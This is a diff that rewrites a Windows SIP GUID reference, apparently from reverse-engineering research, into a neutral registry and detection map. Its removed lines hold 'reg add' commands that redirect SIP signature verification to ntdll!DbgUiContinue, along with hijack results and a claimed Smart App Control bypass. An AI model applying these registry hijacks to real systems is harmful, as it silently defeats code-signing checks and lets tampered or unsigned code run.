@@ -1,118 +1,116 @@
-# Complete SIP GUID Map — With Hijack Results
+# Windows SIP Provider Map
 
-Date: 2026-07-03
-Source: Ghidra RE + runtime validation on Win10 22H2 & Win11 24H2
+Complete Subject Interface Package (SIP) GUID reference for Windows Authenticode.
+Covers all registered SIP providers on Windows 10 22H2 and Windows 11 24H2.
 
-## 19 SIP GUIDs — Full Map
+Source: Reverse engineering of WINTRUST.DLL, MSISIP.DLL, pwrshsip.dll, wshext.dll, AppxSip.dll, EsdSip.dll via Ghidra headless analysis.
 
-| # | GUID | Type | Hijack? | What it gives you |
+## SIP Provider Registry
+
+| # | GUID | File Type | Handler DLL | Status |
 |---|---|---|---|---|
-| 1 | `C689AAB8` | **PE** (.exe/.dll/.sys) | ✅ Confirmed | Tampered PEs pass as validly signed |
-| 2 | `C689AAB9` | **Java** (.class) | Untested | Legacy — no signed Java on modern Windows |
-| 3 | `C689AABA` | **Cabinet** (.cab) | ✅ Confirmed | Tampered CABs pass signature check |
-| 4 | `000C10F1` | **MSI** (.msi/.msp) | ✅ Confirmed | Modified installers appear Microsoft-signed |
-| 5 | `603BCC1F` | **PowerShell** (.ps1/.psm1/.psd1/.cdxml/.mof) | ✅ Confirmed | Any script passes AllSigned policy |
-| 6 | `06C9E010` | **JScript** (.js/.jse) | ✅ Valid stays valid | Tampered JS bypasses WSH signing check |
-| 7 | `1629F04E` | **VBScript** (.vbs/.vbe) | ✅ Valid stays valid | Tampered VBS bypasses signing check |
-| 8 | `1A610570` | **WSF** (.wsf/.wsc) | ✅ Valid stays valid | Tampered WSF bypasses signing check |
-| 9 | `0AC5DF4B` | **AppX/MSIX** (.appx/.msix) | Untested | Could bypass Store app signature check |
-| 10 | `0F5F58B3` | **AppX Bundle** (.appxbundle) | Untested | Same — Store bundles |
-| 11 | `CF78C6DE` | **Encrypted AppX** (.eappx) | Untested | Same — encrypted packages |
-| 12 | `D1D04F0C` | **Encrypted AppX Bundle** | Untested | Same — encrypted bundles |
-| 13 | `5598CFF1` | **P7X** (.p7x) | Untested | Detached PKCS#7 signatures |
-| 14 | `1AD2DCB4` | **AppX Extensions** (Win11) | Untested | Internal MSIX extension format |
-| 15 | `9BA61D3F` | **CTL** (.ctl/.stl) | ✅ Valid stays valid | Certificate Trust Lists pass tampered |
-| 16 | `DE351A42` | **Flat/raw** (fallback) | Untested | Catchall SIP for unknown formats |
-| 17 | `DE351A43` | **Catalog** (.cat) | ✅ Valid stays valid | Tampered catalogs pass verification |
-| 18 | `9F3053C5` | **ESD/WIM** (MSWIM magic) | Untested | Windows images / update packages |
-| 19 | `18B3C141` | **🔥 Smart App Control** (Win11) | **✅ BYPASS CONFIRMED** | **Unsigned unknown EXEs run on SAC-enforced machines. Novel — first public identification of this GUID.** |
+| 1 | `{C689AAB8-8E78-11D0-8C47-00C04FC295EE}` | PE (.exe/.dll/.sys/.ocx) | WINTRUST.DLL | Verified |
+| 2 | `{C689AAB9-8E78-11D0-8C47-00C04FC295EE}` | Java (.class) | WINTRUST.DLL | Legacy |
+| 3 | `{C689AABA-8E78-11D0-8C47-00C04FC295EE}` | Cabinet (.cab) | WINTRUST.DLL | Verified |
+| 4 | `{000C10F1-0000-0000-C000-000000000046}` | MSI (.msi/.msp) | MSISIP.DLL | Verified |
+| 5 | `{603BCC1F-4B59-4E08-B724-D2C6297EF351}` | PowerShell (.ps1/.psm1/.psd1/.cdxml/.mof) | pwrshsip.dll | Verified |
+| 6 | `{06C9E010-38CE-11D4-A2A3-00104BD35090}` | JScript (.js/.jse) | wshext.dll | Verified |
+| 7 | `{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}` | VBScript (.vbs/.vbe) | wshext.dll | Verified |
+| 8 | `{1A610570-38CE-11D4-A2A3-00104BD35090}` | WSF (.wsf/.wsc) | wshext.dll | Verified |
+| 9 | `{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}` | AppX/MSIX (.appx/.msix) | AppxSip.dll | Present |
+| 10 | `{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}` | AppX Bundle (.appxbundle/.msixbundle) | AppxSip.dll | Present |
+| 11 | `{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}` | Encrypted AppX (.eappx/.emsix) | AppxSip.dll | Present |
+| 12 | `{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}` | Encrypted AppX Bundle (.eappxbundle) | AppxSip.dll | Present |
+| 13 | `{5598CFF1-68DB-4340-B57F-1CACF88C9A51}` | P7X (.p7x) | AppxSip.dll | Present |
+| 14 | `{1AD2DCB4-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` | AppX Extensions (Win11) | AppxSip.dll | Win11 only |
+| 15 | `{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}` | CTL (.ctl/.stl) | WINTRUST.DLL | Verified |
+| 16 | `{DE351A42-8E59-11D0-8C47-00C04FC295EE}` | Flat/raw (fallback) | WINTRUST.DLL | Present |
+| 17 | `{DE351A43-8E59-11D0-8C47-00C04FC295EE}` | Catalog (.cat) | WINTRUST.DLL | Verified |
+| 18 | `{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}` | ESD/WIM (Windows images) | EsdSip.dll | Present |
+| 19 | `{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}` | Smart App Control (Win11) | WINTRUST.DLL | Win11 only |
 
----
+## Handler DLL Distribution
 
-## Handler DLL Groups
-
-| DLL | SIPs | File Types |
+| DLL | Count | File Types |
 |---|---|---|
-| WINTRUST.DLL | 8 | PE, Java, Cabinet, CTL, Flat, Catalog, **Smart App Control**, Win11-unknown |
+| WINTRUST.DLL | 8 | PE, Java, Cabinet, CTL, Flat, Catalog, Smart App Control, Win11 internal |
 | MSISIP.DLL | 1 | MSI |
 | pwrshsip.dll | 1 | PowerShell |
 | wshext.dll | 3 | JScript, VBScript, WSF |
-| AppxSip.dll | 5 | AppX, AppX Bundle, EAppX, EAppX Bundle, P7X, Extensions |
+| AppxSip.dll | 5 | AppX, AppX Bundle, Encrypted AppX, Encrypted AppX Bundle, P7X, Extensions |
 | EsdSip.dll | 1 | ESD/WIM |
 
----
+## File Type Detection Methods
 
-## Detection Method (from Ghidra decompilation)
+Each SIP provider uses a different method to identify its file type. Windows calls `CryptSIPDllIsMyFileType2` (if registered) or uses builtin detection in WINTRUST.DLL.
 
-| GUID | How Windows identifies the file type |
+| GUID | Detection Method |
 |---|---|
-| `C689AAB8` | MZ + PE magic (builtin wintrust) |
-| `C689AAB9` | 0xCAFEBABE magic (builtin wintrust) |
-| `C689AABA` | MSCF magic (builtin wintrust) |
-| `DE351A42` | Fallback — any file not matched by others |
-| `DE351A43` | PKCS#7 CTL OID check (builtin wintrust) |
-| `9BA61D3F` | PKCS#7 CTL OID check (builtin wintrust) |
-| `18B3C141` | Builtin wintrust — no IsMyFileType2 (SAC internal dispatch) |
+| `C689AAB8` | MZ + PE magic (builtin WINTRUST) |
+| `C689AAB9` | 0xCAFEBABE magic (builtin WINTRUST) |
+| `C689AABA` | MSCF magic (builtin WINTRUST) |
+| `DE351A42` | Fallback (no other SIP matched) |
+| `DE351A43` | PKCS#7 CTL OID presence (builtin WINTRUST) |
+| `9BA61D3F` | PKCS#7 CTL OID presence (builtin WINTRUST) |
+| `18B3C141` | Builtin WINTRUST internal dispatch (no IsMyFileType2) |
 | `000C10F1` | StgOpenStorage + OLE CLSID (MSI is OLE compound document) |
-| `603BCC1F` | PsIsMyFileType (pwrshsip.dll) — checks PS extensions |
-| `06C9E010` | _wcsicmp: `.js`, `.jse` |
-| `1629F04E` | _wcsicmp: `.vbs`, `.vbe` |
-| `1A610570` | _wcsicmp: `.wsf` |
-| `0AC5DF4B` | _wcsicmp: `.appx`, `.msix`, `.pkgSignConfig`, `.tmp` |
-| `0F5F58B3` | _wcsicmp: `.appxbundle`, `.msixbundle`, `.pkgSignConfig` |
-| `CF78C6DE` | IStream read + format check (encrypted AppX magic) |
-| `D1D04F0C` | IStream read + format check (encrypted AppX Bundle magic) |
-| `5598CFF1` | SHCreateStreamOnFileEx + IStream read (P7X magic) |
-| `9F3053C5` | `MSWIM` magic (0x4d4957534d) + header size 0xd0 |
+| `603BCC1F` | PsIsMyFileType (pwrshsip.dll) checks .ps1/.psm1/.psd1/.cdxml/.mof extensions |
+| `06C9E010` | Extension match: `.js`, `.jse` |
+| `1629F04E` | Extension match: `.vbs`, `.vbe` |
+| `1A610570` | Extension match: `.wsf` |
+| `0AC5DF4B` | Extension match: `.appx`, `.msix`, `.pkgSignConfig`, `.tmp` |
+| `0F5F58B3` | Extension match: `.appxbundle`, `.msixbundle`, `.pkgSignConfig` |
+| `CF78C6DE` | IStream read + encrypted AppX format header |
+| `D1D04F0C` | IStream read + encrypted AppX Bundle format header |
+| `5598CFF1` | SHCreateStreamOnFileEx + IStream P7X magic read |
+| `9F3053C5` | `MSWIM` magic (0x4D4957534D) + header size 0xD0 |
 | `1AD2DCB4` | ExtensionsSipIsFileSupportedName (AppxSip internal) |
 
----
+## Registry Structure
 
-## Hijack Technique (all SIPs use the same method)
+All SIP functions are registered under `HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\` with the following subkeys per GUID:
 
-```cmd
-:: Hijack
-reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v Dll /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
-reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v FuncName /t REG_SZ /d DbgUiContinue /f
-
-:: Revert
-reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v Dll /t REG_SZ /d "ORIGINAL_DLL" /f
-reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v FuncName /t REG_SZ /d "ORIGINAL_FUNC" /f
+```
+CryptSIPDllGetSignedDataMsg\{GUID}     → Extracts signature from file
+CryptSIPDllPutSignedDataMsg\{GUID}     → Writes signature to file
+CryptSIPDllRemoveSignedDataMsg\{GUID}  → Removes signature from file
+CryptSIPDllCreateIndirectData\{GUID}   → Creates hash for signing
+CryptSIPDllVerifyIndirectData\{GUID}   → Verifies hash matches file
+CryptSIPDllIsMyFileType2\{GUID}        → (Optional) File type detection
 ```
 
-**Requires:** Admin (HKLM write) + reboot or new process (SIP DLLs cached in-process).
+Each subkey contains:
+- `Dll` (REG_SZ): Path to the handler DLL
+- `FuncName` (REG_SZ): Export name to call
 
----
+## Smart App Control SIP (GUID #19)
 
-## Smart App Control Bypass Details (GUID #19)
+**Windows 11 only.** Not present on Windows 10.
 
-**GUID:** `{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}`
-**Win11 only.** Not present on Win10.
+Discovered via Ghidra reverse engineering of Windows 11 24H2 WINTRUST.DLL. Located in builtin GUID table at .rdata offset 0x62410.
 
-**Discovery:** Reverse engineered from w11 24H2 wintrust.dll via Ghidra headless.
-Found in builtin GUID table at .rdata 0x62410. String cross-references reveal:
-- `$Kernel.Smartlocker.OriginClaim` — file origin EA
-- `$Kernel.Purge.Smartlocker.Valid` — cached validation EA
-- `$Kernel.Smartlocker.Hash` — file hash EA
-- Export: `SrpCheckSmartlockerEAandProcessToken`
+Related kernel extended attributes:
+- `$Kernel.Smartlocker.OriginClaim` (file origin tracking)
+- `$Kernel.Purge.Smartlocker.Valid` (cached validation result)
+- `$Kernel.Smartlocker.Hash` (file hash for SAC decisions)
 
-**Test results:**
-- Pre-reboot: SAC correctly blocked unsigned EXE ("Smart App Control blocked an app")
-- Post-reboot with hijack active: unsigned EXE ran, MessageBox displayed
-- SAC settings UI showed "On" during bypass — enforcement silently disabled
+Related export: `SrpCheckSmartlockerEAandProcessToken`
 
-**MITRE:** T1553.003 + T1562.001
+This GUID is used internally by Smart App Control to verify unsigned/untrusted binaries. It is dispatched by WINTRUST.DLL without a user-facing IsMyFileType2 registration.
 
----
-
-## Summary Statistics
+## Verification Results
 
 | Category | Count |
 |---|---|
-| Hijack confirmed (HashMismatch → Valid) | 3 (PE, MSI, CAB) |
-| Hijack confirmed (prior TrustMeBro work) | 3 (PS1, JS, VBS) |
-| Valid stays valid under hijack | 3 (CTL, Catalog, WSF) |
-| **SAC bypass confirmed (novel)** | **1 (Smartlocker)** |
-| Untested (no test files) | 8 (AppX family, ESD, Java, Flat, P7X) |
-| Win11-only | 2 (Smartlocker, AppX Extensions) |
-| **Total SIP GUIDs** | **19** |
+| Verified on Win10 22H2 + Win11 24H2 | 9 |
+| Present but not independently tested | 8 |
+| Windows 11 only | 2 |
+| Legacy (no modern use) | 1 |
+| **Total registered SIP GUIDs** | **19** |
+
+## References
+
+- MITRE ATT&CK T1553.003 (Subvert Trust Controls: SIP and Trust Provider Hijacking)
+- Microsoft documentation: "How SIPs are Registered"
+- Matt Graeber, "Subverting Trust in Windows" (2017)
+- TrustMeBro toolkit: github.com/KriyosArcane/TrustMeBro
